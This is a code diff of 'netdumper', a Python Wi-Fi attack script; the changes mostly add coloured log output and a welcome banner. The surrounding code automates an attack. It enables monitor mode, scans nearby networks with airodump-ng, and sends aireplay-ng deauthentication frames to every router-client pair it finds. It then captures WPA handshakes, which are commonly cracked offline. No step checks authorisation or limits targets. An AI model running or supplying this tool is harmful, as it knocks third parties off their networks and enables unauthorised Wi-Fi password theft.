@@ -7,9 +7,15 @@ import shutil
 import re
 import logging
 
+GREEN = "\033[92m"
+RED = "\033[91m"
+PINK = "\033[35m"
+CYAN = "\033[96m"
+RESET = "\033[0m"
+
 logging.basicConfig(
     level=logging.INFO,
-    format='%(asctime)s - [%(levelname)s] - %(message)s',
+    format='\033[0m%(asctime)s - [%(levelname)s] - %(message)s',
     handlers=[
         logging.FileHandler("netdumper.log"),
         logging.StreamHandler()
@@ -35,11 +41,11 @@ def run_command(command, timeout=None, shell=True):
         return te.stdout if te.stdout else ""
 
     except subprocess.CalledProcessError as e:
-        logging.error(f"Error: {command}\nStderr: {e.stderr}")
+        logging.error(f"{RED}Error: {command}\nStderr: {e.stderr}{RESET}")
         raise e
 
 def package_installer():
-    logging.info("Installing Packages:")
+    logging.info(f"{PINK}Installing Packages:")
 
     packages = {
         "iw": "iw",
@@ -56,24 +62,23 @@ def package_installer():
 
     if missing_packages:
         try:
-            logging.info(f"Installing Missing Packages: {missing_packages}")
+            logging.info(f"{PINK}Installing Missing Packages: {missing_packages}")
 
             run_command("sudo apt update")
 
             for package in missing_packages:
                 run_command(f"sudo apt install {package} -y")
 
-            logging.info("All Packages Were Installed Successfully.")
+            logging.info(f"{GREEN}All Packages Were Installed Successfully.")
 
         except Exception as e:
-            logging.error(f"Package Installation Failed: {e}")
+            logging.error(f"{RED}Package Installation Failed: {e}")
             sys.exit(1)
-
     else:
-        logging.info("All Packages Are Already Present In The System.")
+        logging.info(f"{GREEN}All Packages Are Already Present In The System.")
 
 def mapping_interfaces():
-    logging.info("Locating And Categorizing Wi-Fi Plates...")
+    logging.info(f"{CYAN}Locating And Categorizing Wi-Fi Plates...")
 
     interfaces_info = {
         "managed": None,
@@ -102,15 +107,15 @@ def mapping_interfaces():
         run_command("sudo ifconfig")
 
         logging.info(
-            f"Interfaces Identified -> Managed: "
-            f"{interfaces_info['managed']} | "
-            f"Monitor: {interfaces_info['monitor']}"
+            f"{PINK}Interfaces Identified -> Managed: {RESET}"
+            f"{CYAN}{interfaces_info['managed']} | {RESET}"
+            f"{PINK}Monitor: {RESET}{CYAN}{interfaces_info['monitor']}"
         )
 
         return interfaces_info
 
     except Exception as e:
-        logging.error(f"Error Mapping Network Interfaces: {e}")
+        logging.error(f"{RED}Error Mapping Network Interfaces: {e}")
         return interfaces_info
 
 def start(interfaces):
@@ -118,7 +123,7 @@ def start(interfaces):
     
     if not target_plate:
         logging.error(
-            "No Network Plates In 'managed' Mode "
+            f"{CYAN}No Network Plates In 'managed' Mode "
             "Were Found To Initiate The Process."
         )
         return
@@ -126,22 +131,22 @@ def start(interfaces):
     monitor_plate = interfaces["monitor"]
     try:
         if not monitor_plate:
-            logging.info(f"Starting Monitor-Mode In Plate: {target_plate}...")
+            logging.info(f"{PINK}Starting Monitor-Mode In Plate: {RESET}{CYAN}{target_plate}...")
             run_command(f"sudo airmon-ng start {target_plate}")
             interfaces = mapping_interfaces()
             monitor_plate = interfaces["monitor"]
             if not monitor_plate:
                 raise Exception(
-                    "Monitor interface could not be detected "
+                    f"{RED}Monitor interface could not be detected "
                     "After Enabling Monitor Mode."
                 )
         else:
-            logging.info(f"Plate: {monitor_plate} Already In Monitor-Mode")
+            logging.info(f"{PINK}Plate: {RESET}{CYAN}{monitor_plate}{RESET}{PINK} Already In Monitor-Mode")
             
-        logging.info(f"Enabling The Interface: {monitor_plate}...")
+        logging.info(f"{PINK}Enabling The Interface: {RESET}{CYAN}{monitor_plate}...")
         run_command(f"sudo ifconfig {monitor_plate} up")
         
-        logging.info("Checking If The Monitor Interface Is Active...")
+        logging.info(f"{PINK}Checking If The Monitor Interface Is Active...")
         ifconfig_check = run_command("sudo ifconfig")
         if monitor_plate not in ifconfig_check:
             raise Exception(
@@ -150,8 +155,8 @@ def start(interfaces):
             )
             
         logging.info(
-            f"Starting Temporary Scan With airodump-ng "
-            f"On The Board: {monitor_plate}..."
+            f"{PINK}Starting Temporary Scan With airodump-ng "
+            f"On The Board: {RESET}{CYAN}{monitor_plate}..."
         )
         cap_prefix = "airodump_temp"
         try:
@@ -169,15 +174,15 @@ def start(interfaces):
         csv_file = f"{cap_prefix}-01.csv"
         if os.path.exists(csv_file):
             shutil.copy(csv_file, "airodump.txt")
-            logging.info("Monitoring Data Successfully Saved To 'airodump.txt'.")
+            logging.info(f"{GREEN}Monitoring Data Successfully Saved To 'airodump.txt'.")
         else:
             logging.warning(
-                "No Data Was Captured By airodump-ng, "
+                f"{PINK}No Data Was Captured By airodump-ng, "
                 "Or The File Was Not Generated."
             )
             return
             
-        logging.info("Parsing 'airodump.txt' To Identify Targets BSSID And Clients...")
+        logging.info(f"{PINK}Parsing 'airodump.txt' To Identify Targets BSSID And Clients...")
         targets = []
         with open("airodump.txt", "r", encoding="utf-8", errors="ignore") as f:
             lns = f.readlines()
@@ -209,10 +214,10 @@ def start(interfaces):
                     })
                     
         if not targets:
-            logging.warning("No Active Router <-> Client Pair Was Found For Deauthentication.")
+            logging.warning(f"{RED}No Active Router <-> Client Pair Was Found For Deauthentication.")
             return
             
-        logging.info(f"Found {len(targets)} Targets For Deauth.")
+        logging.info(f"{GREEN}Found{RESET} {CYAN}{len(targets)}{RESET} {GREEN}Targets For Deauth.")
         
         for idx, target in enumerate(targets):
             mac_rot = target["mac_router"]
@@ -220,12 +225,12 @@ def start(interfaces):
             channel = target["channel"]
             
             logging.info(
-                f"Processing Target {idx} "
-                f"[Router: {mac_rot} | Client: {mac_cli} | Channel: {channel}]"
+                f"{PINK}Processing Target{RESET}{CYAN} {idx} {RESET}"
+                f"{PINK}[Router:{RESET} {CYAN}{mac_rot}{RESET}{PINK} | Client: {RESET}{CYAN}{mac_cli}{RESET}{PINK} | Channel:{RESET}{CYAN} {channel}]"
             )
             
             logging.info(
-                f"Deauthenticating -> aireplay-ng -0 1 -a {mac_rot} -c {mac_cli} {monitor_plate}"
+                f"{PINK}Deauthenticating ->{RESET} {CYAN}aireplay-ng -0 1 -a {mac_rot} -c {mac_cli} {monitor_plate}"
             )
             run_command(
                 f"sudo aireplay-ng -0 1 -a {mac_rot} -c {mac_cli} {monitor_plate}"
@@ -233,7 +238,7 @@ def start(interfaces):
             
             cap_file = f"package_{idx}"
             logging.info(
-                f"Starting Dynamic Capture for Handshake: {cap_file}.cap on Channel {channel}..."
+                f"{PINK}Starting Dynamic Capture for Handshake: {RESET}{CYAN}{cap_file}.cap on Channel {channel}..."
             )
             
             cmd_capture = (
@@ -269,7 +274,7 @@ def start(interfaces):
                     )
                     
                     if "1 handshake" in check_result.stdout:
-                        logging.info(f"[SUCCESS] 4-Way Handshake captured for BSSID {mac_rot}!")
+                        logging.info(f"{GREEN}[SUCCESS] 4-Way Handshake captured for BSSID {RESET}{CYAN}{mac_rot}!")
                         handshake_captured = True
                         break
             
@@ -280,15 +285,15 @@ def start(interfaces):
                 proc_capture.kill()
                 
             if handshake_captured:
-                logging.info(f"Packet Capture {cap_file} Completed dynamically via EAPOL filter verification.")
+                logging.info(f"{GREEN}Packet Capture {RESET}{CYAN}{cap_file}{RESET}{GREEN} Completed dynamically via EAPOL filter verification.")
             else:
-                logging.warning(f"Capture hit timeout limit without confirming a valid handshake for BSSID {mac_rot}.")
+                logging.warning(f"{RED}Capture hit timeout limit without confirming a valid handshake for BSSID {RESET}{CYAN}{mac_rot}")
                 
     except Exception as e:
-        logging.error(f"A Critical Failure Occurred During The Execution Of The Flow: {e}")
+        logging.error(f"{RED}A Critical Failure Occurred During The Execution Of The Flow: {e}")
         
     finally:
-        logging.info("Interrupting Monitor Mode And Restoring Wi-Fi Network...")
+        logging.info(f"{GREEN}Interrupting Monitor Mode And Restoring Wi-Fi Network...")
         try:
             if monitor_plate:
                 run_command(f"sudo airmon-ng stop {monitor_plate}")
@@ -297,15 +302,43 @@ def start(interfaces):
             except Exception:
                 pass
             run_command("sudo nmcli radio wifi on")
-            logging.info("Network interfaces restored and NetworkManager restarted successfully.")
+            logging.info(f"{GREEN}Network interfaces restored and NetworkManager restarted successfully.")
         except Exception as cleanup_error:
-            logging.error(f"Error while trying to restore default network services: {cleanup_error}")
+            logging.error(f"{RED}Error while trying to restore default network services: {cleanup_error}")
 
 if __name__ == "__main__":
 
     if os.getuid() != 0:
-        print("[ERROR] Root Authority Is Required.")
+        print(f"{RED}[ERROR] Root Authority Is Required.")
         sys.exit(1)
+
+    print(f"""
+{GREEN}#{RESET} {CYAN}======================={RESET} {GREEN}WELCOME TO NETDUMPER{RESET} {CYAN}======================={RESET} {GREEN}#{RESET}
+{GREEN}#                                                                      #{RESET}
+{GREEN}#   => Required Packages:                                              #{RESET}
+{GREEN}#                                                                      #{RESET}
+{GREEN}#{RESET}   {RED}iw{RESET}              {GREEN}->{RESET} {CYAN}iw{RESET}                                              {GREEN}#{RESET}
+{GREEN}#{RESET}   {RED}aircrack-ng{RESET}     {GREEN}->{RESET} {CYAN}aircrack-ng{RESET}                                     {GREEN}#{RESET}
+{GREEN}#{RESET}   {RED}ifconfig{RESET}        {GREEN}->{RESET} {CYAN}net-tools{RESET}                                       {GREEN}#{RESET}
+{GREEN}#{RESET}   {RED}iwconfig{RESET}        {GREEN}->{RESET} {CYAN}wireless-tools{RESET}                                  {GREEN}#{RESET}
+{GREEN}#                                                                      #{RESET}
+{GREEN}#{RESET} {CYAN}--------------------------------------------------------------------{RESET} {GREEN}#{RESET}
+{GREEN}#                                                                      #{RESET}
+{GREEN}#   => Requirements:                                                   #{RESET}
+{GREEN}#                                                                      #{RESET}
+{GREEN}#{RESET}   {RED}[1]{RESET} 2 Wi-Fi plates must be connected.                              {GREEN}#{RESET}
+{GREEN}#{RESET}   {RED}[2]{RESET} At least one must support monitoring mode.                     {GREEN}#{RESET}
+{GREEN}#{RESET}   {RED}[3]{RESET} Check the firmware compatibility.                              {GREEN}#{RESET}
+{GREEN}#                                                                      #{RESET}
+{GREEN}#{RESET} {CYAN}********************************************************************{RESET} {GREEN}#{RESET}
+{GREEN}#                                                                      #{RESET}
+{GREEN}#{RESET}   {RED}SuperUser Mode:{RESET}                                                    {GREEN}#{RESET}
+{GREEN}#{RESET}   {CYAN}~$ ./myuser su{RESET}                                                     {GREEN}#{RESET}
+{GREEN}#                                                                      #{RESET}
+{GREEN}#{RESET} {CYAN}********************************************************************{RESET} {GREEN}#{RESET}
+{GREEN}#{RESET}                      CREATED BY: {GREEN}LUCAS LEBLANC{RESET}                       {GREEN}#{RESET}
+{GREEN}#{RESET} {CYAN}===================================================================={RESET} {GREEN}#{RESET}
+""")
 
     package_installer()
 
